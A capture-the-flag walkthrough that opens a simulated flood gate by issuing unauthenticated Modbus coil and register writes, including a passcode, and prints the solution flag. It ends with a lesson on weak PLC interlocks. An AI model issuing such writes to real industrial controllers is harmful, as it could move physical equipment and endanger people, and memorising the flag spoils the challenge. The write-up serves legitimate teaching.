# Walkthrough: Open the Flood Gate

The attached `operator_manual.txt` spells out the procedure; the challenge is
executing it over Modbus. Addresses below are zero-based.

1. Confirm the key switch is in REMOTE:
   `python3 modbus_client.py EVENT_HOST 8008 read holding 1 1` -> `0x1977`. Good.
2. Engage maintenance mode (coil 00002 -> address 1):
   `python3 modbus_client.py EVENT_HOST 8008 wcoil 1 1`
3. Enter the passcode (40011 -> address 10). The manual says it is the year
   Herrs Island's rail bridge opened, 1878:
   `python3 modbus_client.py EVENT_HOST 8008 wreg 10 1878`
4. Give the open command (coil 00001 -> address 0):
   `python3 modbus_client.py EVENT_HOST 8008 wcoil 0 1`
5. Confirm the gate moved and read the note:
   `python3 modbus_client.py EVENT_HOST 8008 read holding 0 1`   -> 100
   `python3 modbus_client.py EVENT_HOST 8008 read holding 200 26`
   Decode the hex column (CyberChef From Hex, two bytes per register):

   `BarSides{interlocks_are_only_as_strong_as_the_logic}`

Order matters only in that all four conditions must hold at once; the flag
registers read as zero until they do. Writing the wrong passcode, or clearing
maintenance mode, closes the gate again.

Lesson: Modbus writes are unauthenticated. An "interlock" enforced only in PLC
logic is no protection against someone who can reach the control port.
